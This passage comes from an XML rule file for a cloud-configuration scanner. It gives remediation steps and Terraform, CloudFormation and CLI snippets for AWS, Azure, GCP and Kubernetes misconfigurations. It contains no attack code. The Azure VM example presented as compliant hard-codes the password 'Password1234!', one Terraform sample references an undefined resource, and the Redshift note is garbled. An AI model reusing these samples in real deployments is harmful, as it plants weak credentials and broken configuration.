<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/].</li>
<li>Open the <a href="https://console.aws.amazon.com/apigateway" target="_self">Amazon API Gateway console</a>.</li>
<li>In the APIs pane, choose the API, and then click <strong>Stages</strong>.</li>
<li>In the <strong>Stages </strong>pane, choose the name of the stage.</li>
<li>In the<strong> Stage Editor</strong> pane, choose the <strong>Logs/Tracing</strong> tab.</li>
<li>To enable active X-Ray tracing, choose <strong>Enable X-Ray Tracing</strong> under X-Ray Tracing.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws apigateway create-stage \
    --rest-api-id {rest-api-id} \
    --stage-name {stage-name} \
    --deployment-id {deployment-id} \
    --region {region} \
    --tracing-enabled=true
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_api_gateway_stage</li>
<li><strong>Argument:</strong> xray_tracing_enabled - (Optional) Whether active tracing with X-ray is enabled. Defaults to false. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_api_gateway_stage" "test" {
  ...
  stage_name    = "prod"
+ xray_tracing_enabled = true
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::ApiGateway::Stage</li>
<li><strong>Argument:</strong> Properties.TracingEnabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  MyStage:
    Type: AWS::ApiGateway::Stage
    Properties:
      ...
+     TracingEnabled: true
      ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_15' target='_blank'> https://docs.bridgecrew.io/docs/logging_15</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_15' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_64</key>
    <name>Ensure AWS Redshift cluster is encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-redshift-cluster-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-redshift-cluster-not-encrypted"></div>AWS Redshift cluster not encrypted</div><a aria-label="Skip link to AWS Redshift cluster not encrypted" class="heading-anchor-icon fa fa-anchor" href="#aws-redshift-cluster-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>We recommend all data stored in the Redshift cluster is securely encrypted at rest, you can create new encrypted clusters or enable CMK encryption on existing clusters, as AWS says "You can enable encryption when you launch your cluster, or you can modify an unencrypted cluster to use AWS Key Management Service (AWS KMS) encryption"<br/>
<a href="https://docs.aws.amazon.com/redshift/latest/mgmt/working-with-db-encryption.html" target="_self">https://docs.aws.amazon.com/redshift/latest/mgmt/working-with-db-encryption.html</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<p>There is no runtime fix, no clusters can be created encrypted or modified to use a CMK.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime-1"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime-1"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform </div><a aria-label="Skip link to Terraform " class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource: </strong> aws_redshift_cluster</li>
<li><strong>Argument:</strong> encrypted, ensure that this argument is set to true to protect this database. </li>
</ul>
<p>This change may recreate your cluster.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_redshift_cluster.redshift.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_redshift_cluster.redshift.tf">resource "aws_redshift_cluster" "redshift" {
  ...
  cluster_identifier        = "shifty"
+ encrypted                 = true
  kms_key_id                = var.kms_key_id
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation </div><a aria-label="Skip link to CloudFormation " class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource: </strong> AWS::Redshift::Cluster</li>
<li><strong>Argument:</strong> Properties.Encrypted</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: "AWS::Redshift::Cluster"
    Properties:
      ...
+     Encrypted: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_25' target='_blank'> https://docs.bridgecrew.io/docs/general_25</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_25' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_5</key>
    <name>Ensure AWS Elasticsearch domain encryption for data at rest is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elasticsearch-domain-encryption-for-data-at-rest-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elasticsearch-domain-encryption-for-data-at-rest-is-disabled"></div>AWS Elasticsearch domain encryption for data at rest is disabled</div><a aria-label="Skip link to AWS Elasticsearch domain encryption for data at rest is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-elasticsearch-domain-encryption-for-data-at-rest-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Encryption of data at rest is a security feature that helps prevent unauthorized access to your data. The feature uses AWS Key Management Service (AWS KMS) to store and manage your encryption keys and the Advanced Encryption Standard algorithm with 256-bit keys (AES-256) to perform the encryption. If enabled, the feature encrypts the domain's: indices, logs, swap files, all data in the application directory, and automated snapshots.</p>
<p>We recommend you implement encryption at rest in order to protect a data store containing sensitive information from unauthorized access, and fulfill compliance requirements.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="procedure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-procedure"></div>Procedure</div><a aria-label="Skip link to Procedure" class="heading-anchor-icon fa fa-anchor" href="#procedure"></a></h2>
<p>By default, domains do not encrypt data at rest, and you cannot configure existing domains to use EncryptionAtRest.</p>
<p>To enable EncryptionAtRest, you must create a new domain and migrate Elasticsearch to that domain. You will also need, at minimum, read-only permissions to AWS KMS. </p>
<p>To create a new domain sign in to your AWS Console and select the Elasticsearch service (under Analytics), follow these steps:</p>
<ol>
<li>Select <strong>Create a new domain</strong>.</li>
<li>Change the default <strong>Encryption</strong> setting to <strong>enabled</strong>.</li>
<li>Continue configuring your cluster.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---builtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-builtime"></div>Fix - Builtime</div><a aria-label="Skip link to Fix - Builtime" class="heading-anchor-icon fa fa-anchor" href="#fix---builtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<p><strong>Resource:</strong> AWS::Elasticsearch::Domain<br/>
<strong>Argument:</strong> Properties.EncryptionAtRestOptions.Enabled</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  ElasticsearchDomain:
    Type: AWS::Elasticsearch::Domain
    Properties:
      ...
      EncryptionAtRestOptions:
+       Enabled: True
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/elasticsearch_3-enable-encryptionatrest' target='_blank'> https://docs.bridgecrew.io/docs/elasticsearch_3-enable-encryptionatrest</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/elasticsearch_3-enable-encryptionatrest' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_5</key>
    <name>Ensure containers do not run with AllowPrivilegeEscalation</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="containers-run-with-allowprivilegeescalation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-containers-run-with-allow-privilege-escalation"></div>Containers run with AllowPrivilegeEscalation</div><a aria-label="Skip link to Containers run with AllowPrivilegeEscalation" class="heading-anchor-icon fa fa-anchor" href="#containers-run-with-allowprivilegeescalation"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The <strong>AllowPrivilegeEscalation</strong> Pod Security Policy controls whether or not a user is allowed to set the security context of a container to <strong>True</strong>. Setting it to <strong>False</strong> ensures that no child process of a container can gain more privileges than its parent.</p>
<p>We recommend you to set <strong>AllowPrivilegeEscalation</strong> to <strong>False</strong>, to ensure <strong>RunAsUser</strong> commands cannot bypass their existing sets of permissions.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Argument</strong>: allowPrivilegeEscalation (Optional)<br/>
If false, the pod can not request to allow privilege escalation. Default to true.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;Pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    securityContext:
+      allowPrivilegeEscalation: false
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_19' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_19</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_19' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_9</key>
    <name>Ensure Azure Virtual Machines are utilizing managed disks</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-virtual-machines-are-not-utilizing-managed-disks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-virtual-machines-are-not-utilizing-managed-disks"></div>Azure Virtual Machines are not utilizing managed disks</div><a aria-label="Skip link to Azure Virtual Machines are not utilizing managed disks" class="heading-anchor-icon fa fa-anchor" href="#azure-virtual-machines-are-not-utilizing-managed-disks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Migrate BLOB based VHD's to Managed Disks on Virtual Machines to exploit the default features of this configuration. The features include</p>
<ol>
<li>Default Disk Encryption</li>
<li>Resilience as Microsoft will managed the disk storage and move around if<br/>
underlying hardware goes faulty</li>
<li>Reduction of costs over storage accounts</li>
</ol>
<p>Managed disks are by default encrypted on the underlying hardware so no additional encryption is required for basic protection, it is available if additional encryption is required. Managed disks are by design more resilient that storage accounts.<br/>
For ARM deployed Virtual Machines, Azure Adviser will at some point recommend moving VHD's to managed disks both from a security and cost management perspective.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_virtual_machine</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_virtual_machine" "virtual_machine_good" {
  name                  = "my-vm"
  location              = "location"
  resource_group_name   = "group_name"
  network_interface_ids = ["1234567"]
  vm_size               = "Standard_DS1_v2"

  storage_image_reference {
    publisher = "Canonical"
    offer     = "UbuntuServer"
    sku       = "16.04-LTS"
    version   = "latest"
  }
  storage_os_disk {
    name              = "myosdisk1"
    caching           = "ReadWrite"
    create_option     = "FromImage"
    managed_disk_type = "Standard_LRS"
  }
  os_profile {
    computer_name  = "hostname"
    admin_username = "testadmin"
    admin_password = "Password1234!"
  }
  os_profile_linux_config {
    disable_password_authentication = false
  }
  tags = {
    environment = "staging"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-virtual-machines-are-utilizing-managed-disks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-virtual-machines-are-utilizing-managed-disks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-virtual-machines-are-utilizing-managed-disks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_18</key>
    <name>Ensure Azure storage account encryption CMKs are enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-storage-account-encryption-cmks-are-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-storage-account-encryption-cm-ks-are-disabled"></div>Azure storage account encryption CMKs are disabled</div><a aria-label="Skip link to Azure storage account encryption CMKs are disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-storage-account-encryption-cmks-are-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>By default all data at rest in Azure Storage account is encrypted using Microsoft Managed Keys. It is recommended to use Customer Managed Keys to encrypt data in Azure Storage accounts for better control on Storage account data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-console"></div>In Azure Console</div><a aria-label="Skip link to In Azure Console" class="heading-anchor-icon fa fa-anchor" href="#in-azure-console"></a></h2>
<ol>
<li>Log in to Azure Portal</li>
<li>Go to Storage accounts dashboard and Click on reported storage account</li>
<li>Under the Settings menu, click on Encryption</li>
<li>Select Customer Managed Keys</li>
</ol>
<ul>
<li>Choose 'Enter key URI' and Enter 'Key URI'<br/>
OR</li>
<li>Choose 'Select from Key Vault', Enter 'Key Vault' and 'Encryption Key'</li>
</ul>
<ol start="5">
<li>Click on 'Save'"</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_storage_account_customer_managed_key , azurerm_client_config,  azurerm_key_vault, azurerm_key_vault_key</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">data "azurerm_client_config" "current" {}

resource "azurerm_key_vault" "example" {
  name                = "examplekv"
  location            = "location"
  resource_group_name = "group"
  tenant_id           = data.azurerm_client_config.current.tenant_id
  sku_name            = "standard"

  purge_protection_enabled = true
}

resource "azurerm_key_vault_key" "example" {
  name         = "tfex-key"
  key_vault_id = azurerm_key_vault.example.id
  key_type     = "RSA"
  key_size     = 2048
  key_opts     = ["decrypt", "encrypt", "sign", "unwrapKey", "verify", "wrapKey"]
}


resource "azurerm_storage_account" "storage_account_good_1" {
  name                     = "examplestor"
  resource_group_name      = "group"
  location                 = "location"
  account_tier             = "Standard"
  account_replication_type = "GRS"

  identity {
    type = "SystemAssigned"
  }
}

resource "azurerm_storage_account_customer_managed_key" "managed_key_good" {
  storage_account_id = azurerm_storage_account.storage_account_good_1.id
  key_vault_id       = azurerm_key_vault.example.id
  key_name           = azurerm_key_vault_key.example.name
  key_version = "1"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-storage-accounts-use-customer-managed-key-for-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-storage-accounts-use-customer-managed-key-for-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-storage-accounts-use-customer-managed-key-for-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_62</key>
    <name>Ensure bucket logs access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="bucket-does-not-log-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-bucket-does-not-log-access"></div>Bucket does not log access</div><a aria-label="Skip link to Bucket does not log access" class="heading-anchor-icon fa fa-anchor" href="#bucket-does-not-log-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Some resources  require a record of who access them and when.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_storage_bucket</li>
<li><strong>Argument</strong>: logging/log_bucket to specify a Bucket to store access log in.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_storage_bucket" "logging" {
  name     = "jgwloggingbucket"
  location = var.location
  uniform_bucket_level_access = true
+  logging {
+    log_bucket = "mylovelybucket"
+  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_logging_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_logging_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_logging_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_20</key>
    <name>Ensure Azure storage account logging for tables is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-storage-account-logging-for-tables-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-storage-account-logging-for-tables-is-disabled"></div>Azure storage account logging for tables is disabled</div><a aria-label="Skip link to Azure storage account logging for tables is disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-storage-account-logging-for-tables-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Storage Table storage is a service that stores structure NoSQL data in the cloud, providing a key/attribute store with a schema less design. Storage Logging happens server- side and allows details for both successful and failed requests to be recorded in the storage account. These logs allow users to see the details of read, write, and delete operations against the tables. Storage Logging log entries contain the following information about individual requests: Timing information such as start time, end-to-end latency, and server latency, authentication details , concurrency information and the sizes of the request and response messages.<br/>
Storage Analytics logs contain detailed information about successful and failed requests to a storage service. This information can be used to monitor individual requests and to diagnose issues with a storage service. Requests are logged on a best-effort basis.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_resource_group, azurerm_log_analytics_workspace, azurerm_storage_account, azurerm_log_analytics_storage_insights, azurerm_storage_table</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "blobExample_ok" {
  name     = "example-resources"
  location = "West Europe"
}

resource "azurerm_log_analytics_workspace" "blobExample_ok" {
  name                = "exampleworkspace"
  location            = azurerm_resource_group.blobExample_ok.location
  resource_group_name = azurerm_resource_group.blobExample_ok.name
  sku                 = "PerGB2018"
  retention_in_days   = 30
}

resource "azurerm_storage_account" "blobExample_ok" {
  name                     = "examplestoracc"
  resource_group_name      = azurerm_resource_group.blobExample_ok.name
  location                 = azurerm_resource_group.blobExample_ok.location
  account_tier             = "Standard"
  account_replication_type = "LRS"
}

resource "azurerm_log_analytics_storage_insights" "blobExample_ok" {
  name                = "example-storageinsightconfig"
  resource_group_name = azurerm_resource_group.blobExample_ok.name
  workspace_id        = azurerm_log_analytics_workspace.blobExample_ok.id

  storage_account_id  = azurerm_storage_account.blobExample_ok.id
  storage_account_key = azurerm_storage_account.blobExample_ok.primary_access_key
  table_names = ["myexampletable_ok"]
}

resource "azurerm_storage_table" "blobExample_ok" {
  name                   = "myexampletable_ok"
  storage_account_name   = azurerm_storage_account.blobExample_ok.name
  storage_container_name = azurerm_storage_container.blobExample_ok.name
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-storage-logging-is-enabled-for-table-service-for-read-requests' target='_blank'> https://docs.bridgecrew.io/docs/ensure-storage-logging-is-enabled-for-table-service-for-read-requests</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
